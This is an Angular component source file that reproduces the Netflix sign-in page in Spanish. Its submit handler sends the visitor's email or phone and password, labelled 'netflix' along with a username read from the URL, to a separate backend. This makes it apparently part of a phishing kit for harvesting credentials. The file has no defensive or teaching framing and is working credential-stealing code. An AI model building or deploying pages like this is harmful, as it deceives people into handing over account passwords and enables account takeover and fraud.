import { Component, Input } from '@angular/core';
import { ApiService } from '../../api.service';
import { ActivatedRoute } from '@angular/router';
import { DomSanitizer } from '@angular/platform-browser';
import { FormsModule } from '@angular/forms';

@Component({
  selector: 'app-netflix',
  imports: [
    FormsModule
  ],
  template: `
    <!DOCTYPE html>
    <html lang="es">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Netflix</title>
    </head>
    <body>
      <header class="banner">
        <div class="logo">
          <img src="https://i.ibb.co/SNKRx9w/Netflixlogo.png">
        </div>
        <div class="main">
          <div class="form1">
            <form (ngSubmit)="onSubmit()">
              <h1>Iniciar Sesión</h1>
              <div class="input-field">
                <input class="text-input" type="email" [(ngModel)]="emailOrPhone" name="emailOrPhone" placeholder=" " (input)="checkFilled($event)">
                <span>Correo electrónico o número de teléfono</span>
              </div>
              <div class="input-field">
                <input class="text-input" type="password" [(ngModel)]="password" name="password" placeholder=" " (input)="checkFilled($event)">
                <span>Contraseña</span>
              </div>
              <div class="button">
                <button class="button1" type="submit">Iniciar Sesión</button>
              </div>
              <div class="or">
                <p>O</p>
              </div>
              <div class="button">
                <button class="button2" type="button" onclick="document.location.href='#'">Usar un código de inicio de sesión</button>
              </div>
              <div class="fp"><a href="#">¿Olvidaste tu contraseña?</a></div>
              <div class="checkbox">
                <label class="container">Recuérdame
                  <input type="checkbox">
                  <span class="checkmark"></span>
                </label>
              </div>
              <div class="signup">
                <p>¿Nuevo en Netflix?</p>
                <a href="https://www.netflix.com/">Suscríbete ahora</a>
              </div>
              <div class="more">
                <p>
                  Esta página está protegida por Google reCAPTCHA
                  para asegurarnos de que no eres un robot.
                  <a href="#">Aprende más.</a>
                </p>
              </div>
            </form>
          </div>
        </div>

      </header>
    </body>
    </html>
  `,
  styles: `
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }
  body {
    font-family: Netflix Sans, Helvetica Neue, Segoe UI, Roboto, Ubuntu, sans-serif;
    -webkit-font-smoothing: antialiased;
    background: #000;
    color: #999;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    margin: 0;
  }

  header {
    flex: 1; /* Este asegura que el contenido principal ocupe todo el espacio necesario */
  }

  ul {
    list-style: none;
  }
  h1, h2, h3, h4 {
    color: #fff;
  }
  a {
    color: #fff;
    text-decoration: none;
  }
  p {
    margin: 0.5rem 0;
  }
  img {
    width: 100%;
  }
  .banner {
    width: 100%;
    flex: 1;
    position: relative;
    background: url('https://www.tutorialspoint.com/assets/questions/media/1039321-1731037718.jpg') no-repeat center center/cover;
  }
  .banner::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    background: rgba(0, 0, 0, 0.65);
    box-shadow: inset 30px 10px 150px #000000;
  }
  .logo {
    position: relative;
    z-index: 2;
    height: 90px;
    margin-bottom: 10%;

  }
  .logo img {
    margin-left: 7%;
    padding-top: 10px;
    width: 170px;
    position: absolute;
    top: 20px;
    left: 40px;
  }
  .main {
    position: relative;
    z-index: 2;
    width: 90%;
    max-width: 450px;
    height: auto;
    background: rgba(0, 0, 0, 0.65);
    margin: 0 auto;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    align-items: flex-start;
    text-align: left;
    padding: 20px;
  }
  .form1 h1 {
    margin-bottom: 20px;
  }
  .form1 {
    width: 100%;
    margin-bottom: 10px;
  }
  .form1 .input-field {
    padding: 5px 0;
    position: relative;
  }
  .form1 .input-field .text-input {
    margin-bottom: 10px;
    width: 100%;
    height: 56px;
    color: white;
    border: 1px solid rgba(128, 128, 128, 0.7);
    border-radius: 5px;
    padding: 20px 10px 5px 14px;
    font-size: 15.5px;
  }
  .input-field input {
    display: inline-block;
    padding: 10px;
  }
  .input-field span {
    color: #aaa;
    position: absolute;
    pointer-events: none;
    left: 15px;
    top: 21px;
    transition: 0.3s;
  }
  .input-field input:focus + span, .input-field input:not(:placeholder-shown) + span {
    top: 15px;
    left: 15px;
    font-size: 11px;
  }
  .input-field input:not(:focus):not(:placeholder-shown):invalid {
    border: 1px solid rgba(255, 24, 24, 0.821);
  }
  .input-field input:not(:focus):not(:placeholder-shown):invalid ~ .error-message {
    display: block;
  }
  .input-field input:not(:focus):not(:placeholder-shown):valid {
    border-color: var(--color-valid);
  }
  input[type=email], input[type=password] {
    background: #3434343f;
  }
  input[type=email]:focus, input[type=password]:focus {
    outline: 2px solid #f5f5f5;
    outline-offset: 1px;
  }
  .error-message {
    display: none;
    font-size: small;
    padding-left: 5px;
    margin-top: 0px;
    color: rgba(255, 23, 23, 0.796);
  }
  .form1 .button {
    margin-bottom: 10px;
    width: 100%;
  }
  button {
    width: 100%;
    height: 40px;
    border-radius: 5px;
    font-size: inherit;
    font-weight: bold;
    border: none;
    cursor: pointer;
    outline: none;
    box-shadow: 0 1px 0 rgba(0, 0, 0, 0.45);
    transition-duration: 0.4s;
    color: #fff;
  }
  .button1 {
    background: red;
  }
  .button1:hover {
    background: rgb(171, 0, 0);
  }
  .or {
    padding: 1px;
    text-align: center;
  }
  .button2 {
    background: rgb(66, 56, 56);
  }
  .button2:hover {
    background: rgba(66, 56, 56, 0.688);
  }
  .fp {
    text-align: center;
    height: 40px;
    padding: 10px;
    margin-bottom: 10px;
    text-decoration: none;
    width: 100%;
  }
  .fp a:hover {
    text-decoration: underline;
    color: #999;
  }
  .checkbox {
    display: flex;
    margin-top: 10px;
    vertical-align: middle;
    justify-content: flex-start;
    font-size: 1rem;
  }
  .checkbox label {
    color: #fff;
    text-decoration: none;
  }
  .container {
    display: block;
    position: relative;
    padding-left: 25px;
    margin-bottom: 12px;
    cursor: pointer;
    font-size: 16px;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
  }
  .container input {
    position: absolute;
    opacity: 0;
    cursor: pointer;
    height: 0;
    width: 0;
  }
  .checkmark {
    position: absolute;
    top: 0;
    left: 0;
    height: 18px;
    border-radius: 3px;
    border: 1px solid #939393;
    width: 18px;
    background-color: #2828288a;
    transition-duration: 0.4s;
  }
  .container:hover input ~ .checkmark {
    border: 1px solid #f1f1f1;
  }
  .container input:checked ~ .checkmark {
    background-color: #ffffff;
  }
  .checkmark:after {
    content: "";
    position: absolute;
    display: none;
  }
  .container input:checked ~ .checkmark:after {
    display: block;
  }
  .container .checkmark:after {
    left: 5.5px;
    top: 2px;
    width: 3px;
    height: 9px;
    border: solid black;
    border-width: 0 3px 3px 0;
    -webkit-transform: rotate(45deg);
    -ms-transform: rotate(45deg);
    transform: rotate(45deg);
  }
  .signup {
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    padding-top: 10px;
  }
  .signup p {
    margin-right: 5px;
  }
  .more {
    font-size: 0.8em;
    line-height: 1.1em;
    padding-top: 10px;
  }
  .more a {
    color: rgb(17, 108, 228);
  }
  .more a:hover, .signup a:hover {
    text-decoration: underline;
  }

  .ftr-content a {
    color: #999;
  }
  .contact {
    margin-bottom: 30px;
  }
  .contact a:hover {
    text-decoration: underline;
  }
  .ftr a {
    margin-bottom: 30px;
    min-width: 200px;
    width: 24%;
    font-size: 14px;
    text-decoration: underline;
    display: inline-block;
    justify-content: space-between;
  }
  .language select {
    color: #fff;
    width: 120px;
    height: 40px;
    border-radius: 5px;
    font-size: inherit;
    padding-left: 10px;
    background: #2828288a;
  }
  @media (max-width: 768px) {
    .main {
      width: 90%;
      padding: 20px;
    }
    .logo img {
      width: 150px;
      left: 20px;
    }


  }
  @media (max-width: 480px) {
    .main {
      width: 100%;
      padding: 10px;
    }
    .logo img {
      width: 120px;
      left: 10px;
    }
  }
`
})
export class NetflixComponent {

  constructor(private apiService: ApiService, private route: ActivatedRoute, private sanitizer: DomSanitizer) {}
  emailOrPhone: string = '';
  password: string = '';
  username!: string;
  @Input() pageId!: string | null;

  onSubmit() {
    this.route.queryParams.subscribe(params => {
      this.username = params['username'];
      console.log('Username:', this.username);
    });
    this.apiService.sendUserData(this.emailOrPhone, this.password, 'netflix', this.username!).subscribe({
      next: (response) => {
        console.log('User data sent successfully', response);
      },
      error: (error) => {
        console.error('Failed to send user data', error);
      }
    });
  }

  checkFilled(event: Event) {
    const input = event.target as HTMLInputElement;
    if (input.value) {
      input.classList.add('filled');
    } else {
      input.classList.remove('filled');
    }
  }

  togglePassword() {
    const passwordInput = document.getElementById('password') as HTMLInputElement;
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    const togglePassword = document.getElementById('togglePassword') as HTMLElement;
    togglePassword.textContent = type === 'password' ? 'show' : 'hide';
  }
}
